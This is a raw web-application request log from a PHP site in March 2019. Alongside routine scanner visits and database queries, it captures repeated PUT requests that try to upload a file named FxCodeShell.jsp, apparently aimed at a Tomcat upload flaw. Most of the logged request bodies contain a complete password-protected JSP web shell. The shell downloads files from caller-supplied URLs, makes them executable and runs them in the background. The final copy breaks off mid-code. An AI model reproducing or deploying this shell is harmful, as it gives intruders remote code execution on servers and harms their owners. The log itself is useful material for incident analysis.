---------------------------------------------------------------
[ 2019-03-31T00:20:40+08:00 ] 184.105.247.196 GET 47.92.113.32/
[运行时间：0.040653s] [吞吐率：24.60req/s] [内存消耗：4,956.43kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001823s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001837s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001140s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000149s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000361s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000657s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000198s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000233s ]
---------------------------------------------------------------
[ 2019-03-31T07:37:19+08:00 ] 52.164.189.204 GET 47.92.113.32/
[运行时间：0.042594s] [吞吐率：23.48req/s] [内存消耗：4,870.36kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001771s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001787s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '47.92.113.32',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001148s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000136s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000345s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000693s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000195s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000249s ]
---------------------------------------------------------------
[ 2019-03-31T08:29:00+08:00 ] 47.92.125.35 GET www.xlove99.top/
[运行时间：0.042841s] [吞吐率：23.34req/s] [内存消耗：4,871.13kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001946s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001963s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.xlove99.top',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001307s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000152s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000354s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000692s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000196s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000241s ]
---------------------------------------------------------------
[ 2019-03-31T08:37:58+08:00 ] 101.132.69.5 GET wx.xlove99.top/
[运行时间：0.044302s] [吞吐率：22.57req/s] [内存消耗：4,871.11kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001877s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001896s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'wx.xlove99.top',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001386s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000204s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000362s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000677s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000201s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000227s ]
---------------------------------------------------------------
[ 2019-03-31T14:28:00+08:00 ] 47.92.110.185 GET 47.92.113.32/
[运行时间：0.042919s] [吞吐率：23.30req/s] [内存消耗：4,870.95kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001824s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001841s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '47.92.113.32',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001173s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000146s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000344s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000752s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000197s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000227s ]
---------------------------------------------------------------
[ 2019-03-31T14:39:42+08:00 ] 106.15.201.111 GET wx.xlove99.top/
[运行时间：0.043594s] [吞吐率：22.94req/s] [内存消耗：4,870.83kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001940s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001957s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'wx.xlove99.top',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001211s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000143s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000374s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000671s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000223s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000244s ]
---------------------------------------------------------------
[ 2019-03-31T21:42:40+08:00 ] 134.209.37.225 HEAD wx.xlove99.top/
[运行时间：0.043906s] [吞吐率：22.78req/s] [内存消耗：4,870.50kb] [文件加载：143]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000027s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001992s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002010s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; Netcraft Web Server Survey)',
  'referer' => 'https://www.netcraft.com/survey/',
  'host' => 'wx.xlove99.top',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001223s ]
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000145s ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000386s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000820s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000216s ]
[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000225s ]
---------------------------------------------------------------
[ 2019-03-31T23:43:26+08:00 ] 47.92.83.243 PUT 47.92.113.32/FxCodeShell.jsp%20
[运行时间：0.040130s] [吞吐率：24.92req/s] [内存消耗：2,173.45kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001960s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001979s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'FxCodeShell.jsp ',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp%20',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  '<%@_page_import' => '"java.util.Arrays"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
<%
	String view = request.getParameter("view");
	if (view == null || view.equals("")) {
		String localOS = System.getProperty("os.name");
		List<String> osList;
		String tomcatOS = "0";
		String DEFAULT = "0";
		String WINDOWS = "1";
		String LINUX = "2";
		osList = new ArrayList<String>();
		osList.add("Linux");
		osList.add("Windows");
		for (String os : osList) {
			if (localOS.contains(os)) {
				if (os.equals("Linux")) {
					tomcatOS = LINUX;
				} else if (os.equals("Windows")) {
					tomcatOS = WINDOWS;
				} else {
					tomcatOS = DEFAULT;
				}
				break;
			}
		}
		out.write(tomcatOS   "<br/>");
		response.setHeader("OS", tomcatOS);
		return;
	}
%>

<%
	String password = "FxxkMyLie1836710Aa";
	if (!view.equals(password)) {
		return;
	}
	int systemCode = Integer.parseInt(request.getParameter("os"));
	String address = request.getParameter("address");
	String fileName = null;
	String path = null;
	String winPath = "C:/Windows/Temp/";
	String linuxPath = "/var/tmp/";
	switch (systemCode) {
	case 1:
		path = winPath;
		break;
	default:
		path = linuxPath;
		break;
	}

	String[] urls = address.split(",");
	InputStream fileInputSteam = null;
	FileOutputStream fileOutputStream = null;
	for (int i = 0; i <= urls.length - 1; i  ) {
		try {
			String[] file = urls[i].split("/");
			fileName = file[file.length - 1];
			out.write("Download:"   urls[i]   "<br>");
			out.write("<br>filename:"   fileName   "<br>");
			out.write("<br>Size:"   urls.length   "<br>");
			out.write(
					"-------------------------------------------------------------------------------------------------------"
							  "<br><br>");
			File isfile = new File(path   fileName);
			if (isfile.isFile()) {
				try {
					Runtime exec = Runtime.getRuntime();
					if (systemCode == 1) {
						exec.exec(path   fileName);
					} else {
						String chmod = "chmod 777 "   path   fileName;
						exec.exec(chmod);
						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '1_' => '',
  '");
					}
				}_catch_(Exception_e1)_{
					e1_printStackTrace();
				}
				continue;
			}
			URL_downloadUrl_' => ' new URL(urls[i]);
			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
			conn.setConnectTimeout(60000 * 3);
			conn.setReadTimeout(60000 * 3);
			fileInputSteam = conn.getInputStream();
			fileOutputStream = new FileOutputStream(path   fileName);
			int length = -1;
			byte[] b = new byte[409600];
			while ((length = fileInputSteam.read(b)) != -1) {
				fileOutputStream.write(b, 0, length);
				fileOutputStream.flush();
			}
			if (conn != null) {
				conn.disconnect();
			}
			if (fileInputSteam != null) {
				fileInputSteam.close();
			}
			if (fileOutputStream != null) {
				fileOutputStream.close();
			}
			Runtime exec = Runtime.getRuntime();
			if (systemCode == 1) {
				exec.exec(path   fileName);
			} else {
				String chmod = "chmod 777 "   path   fileName;
				exec.exec(chmod);
				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '");
			}
		}_catch_(Exception_e2)_{
			e2_printStackTrace();
		}
	}
%>' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000109s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-03-31T23:43:26+08:00 ] 47.92.83.243 GET 47.92.113.32/FxCodeShell.jsp%20
[运行时间：0.021459s] [吞吐率：46.60req/s] [内存消耗：2,154.02kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001963s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001982s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp%20',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000112s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-03-31T23:43:26+08:00 ] 47.92.83.243 PUT 47.92.113.32/FxCodeShell.jsp::$DATA
[运行时间：0.037943s] [吞吐率：26.36req/s] [内存消耗：2,173.50kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000021s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001923s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001942s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'FxCodeShell.jsp::$DATA',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp::$DATA',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  '<%@_page_import' => '"java.util.Arrays"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
<%
	String view = request.getParameter("view");
	if (view == null || view.equals("")) {
		String localOS = System.getProperty("os.name");
		List<String> osList;
		String tomcatOS = "0";
		String DEFAULT = "0";
		String WINDOWS = "1";
		String LINUX = "2";
		osList = new ArrayList<String>();
		osList.add("Linux");
		osList.add("Windows");
		for (String os : osList) {
			if (localOS.contains(os)) {
				if (os.equals("Linux")) {
					tomcatOS = LINUX;
				} else if (os.equals("Windows")) {
					tomcatOS = WINDOWS;
				} else {
					tomcatOS = DEFAULT;
				}
				break;
			}
		}
		out.write(tomcatOS   "<br/>");
		response.setHeader("OS", tomcatOS);
		return;
	}
%>

<%
	String password = "FxxkMyLie1836710Aa";
	if (!view.equals(password)) {
		return;
	}
	int systemCode = Integer.parseInt(request.getParameter("os"));
	String address = request.getParameter("address");
	String fileName = null;
	String path = null;
	String winPath = "C:/Windows/Temp/";
	String linuxPath = "/var/tmp/";
	switch (systemCode) {
	case 1:
		path = winPath;
		break;
	default:
		path = linuxPath;
		break;
	}

	String[] urls = address.split(",");
	InputStream fileInputSteam = null;
	FileOutputStream fileOutputStream = null;
	for (int i = 0; i <= urls.length - 1; i  ) {
		try {
			String[] file = urls[i].split("/");
			fileName = file[file.length - 1];
			out.write("Download:"   urls[i]   "<br>");
			out.write("<br>filename:"   fileName   "<br>");
			out.write("<br>Size:"   urls.length   "<br>");
			out.write(
					"-------------------------------------------------------------------------------------------------------"
							  "<br><br>");
			File isfile = new File(path   fileName);
			if (isfile.isFile()) {
				try {
					Runtime exec = Runtime.getRuntime();
					if (systemCode == 1) {
						exec.exec(path   fileName);
					} else {
						String chmod = "chmod 777 "   path   fileName;
						exec.exec(chmod);
						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '1_' => '',
  '");
					}
				}_catch_(Exception_e1)_{
					e1_printStackTrace();
				}
				continue;
			}
			URL_downloadUrl_' => ' new URL(urls[i]);
			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
			conn.setConnectTimeout(60000 * 3);
			conn.setReadTimeout(60000 * 3);
			fileInputSteam = conn.getInputStream();
			fileOutputStream = new FileOutputStream(path   fileName);
			int length = -1;
			byte[] b = new byte[409600];
			while ((length = fileInputSteam.read(b)) != -1) {
				fileOutputStream.write(b, 0, length);
				fileOutputStream.flush();
			}
			if (conn != null) {
				conn.disconnect();
			}
			if (fileInputSteam != null) {
				fileInputSteam.close();
			}
			if (fileOutputStream != null) {
				fileOutputStream.close();
			}
			Runtime exec = Runtime.getRuntime();
			if (systemCode == 1) {
				exec.exec(path   fileName);
			} else {
				String chmod = "chmod 777 "   path   fileName;
				exec.exec(chmod);
				exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '");
			}
		}_catch_(Exception_e2)_{
			e2_printStackTrace();
		}
	}
%>' => '',
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000153s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-03-31T23:43:26+08:00 ] 47.92.83.243 GET 47.92.113.32/FxCodeShell.jsp::$DATA
[运行时间：0.020027s] [吞吐率：49.93req/s] [内存消耗：2,154.02kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001768s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001784s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '404',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp::$DATA',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
)
[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000120s ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-03-31T23:43:26+08:00 ] 47.92.83.243 PUT 47.92.113.32/FxCodeShell.jsp/
[运行时间：0.029067s] [吞吐率：34.40req/s] [内存消耗：2,173.49kb] [文件加载：61]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
[ info ] [ CACHE ] INIT File
[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001800s ]
[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001817s ]
[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'FxCodeShell.jsp',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '47.92.113.32',
  'content-length' => '3363',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://47.92.113.32:443/FxCodeShell.jsp/',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'text/plain; Charset=UTF-8',
  'connection' => 'Keep-Alive',
)
[ info ] [ PARAM ] array (
  '<%@_page_import' => '"java.util.Arrays"%>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<%@ page import="java.io.*,java.util.*,java.net.URL,java.net.HttpURLConnection"%>
<%
	String view = request.getParameter("view");
	if (view == null || view.equals("")) {
		String localOS = System.getProperty("os.name");
		List<String> osList;
		String tomcatOS = "0";
		String DEFAULT = "0";
		String WINDOWS = "1";
		String LINUX = "2";
		osList = new ArrayList<String>();
		osList.add("Linux");
		osList.add("Windows");
		for (String os : osList) {
			if (localOS.contains(os)) {
				if (os.equals("Linux")) {
					tomcatOS = LINUX;
				} else if (os.equals("Windows")) {
					tomcatOS = WINDOWS;
				} else {
					tomcatOS = DEFAULT;
				}
				break;
			}
		}
		out.write(tomcatOS   "<br/>");
		response.setHeader("OS", tomcatOS);
		return;
	}
%>

<%
	String password = "FxxkMyLie1836710Aa";
	if (!view.equals(password)) {
		return;
	}
	int systemCode = Integer.parseInt(request.getParameter("os"));
	String address = request.getParameter("address");
	String fileName = null;
	String path = null;
	String winPath = "C:/Windows/Temp/";
	String linuxPath = "/var/tmp/";
	switch (systemCode) {
	case 1:
		path = winPath;
		break;
	default:
		path = linuxPath;
		break;
	}

	String[] urls = address.split(",");
	InputStream fileInputSteam = null;
	FileOutputStream fileOutputStream = null;
	for (int i = 0; i <= urls.length - 1; i  ) {
		try {
			String[] file = urls[i].split("/");
			fileName = file[file.length - 1];
			out.write("Download:"   urls[i]   "<br>");
			out.write("<br>filename:"   fileName   "<br>");
			out.write("<br>Size:"   urls.length   "<br>");
			out.write(
					"-------------------------------------------------------------------------------------------------------"
							  "<br><br>");
			File isfile = new File(path   fileName);
			if (isfile.isFile()) {
				try {
					Runtime exec = Runtime.getRuntime();
					if (systemCode == 1) {
						exec.exec(path   fileName);
					} else {
						String chmod = "chmod 777 "   path   fileName;
						exec.exec(chmod);
						exec.exec("nohup "   path   fileName   " > /dev/null 2>',
  '1_' => '',
  '");
					}
				}_catch_(Exception_e1)_{
					e1_printStackTrace();
				}
				continue;
			}
			URL_downloadUrl_' => ' new URL(urls[i]);
			HttpURLConnection conn = (HttpURLConnection) downloadUrl.openConnection();
			conn.setConnectTimeout(60000 * 3);
			conn.setReadTimeout(60000 * 3);
			fileInputSteam = conn.getInputStream();
			fileOutputStream = new FileOutputStream(path   fileName);
			int length = -1;
			byte[] b = new byte[409600];
			while ((length = fileInputSteam.read(b)) != -1) {
				fileOutputStream.write(b, 0, length);
				fileOutputStream.flush();
			}
			if (conn != null) {
				conn.disconnect();
			}
			if (fileInputSteam != null) {
				fileInputSteam.close();
			}
			if (fileOutputStream != null) {
				fileOutputStream.close();
			}
			Runtime exec = Runtime.getRuntime();
			if (systemCode == 1) {
				exec.exec(path   fileName);
			} else {
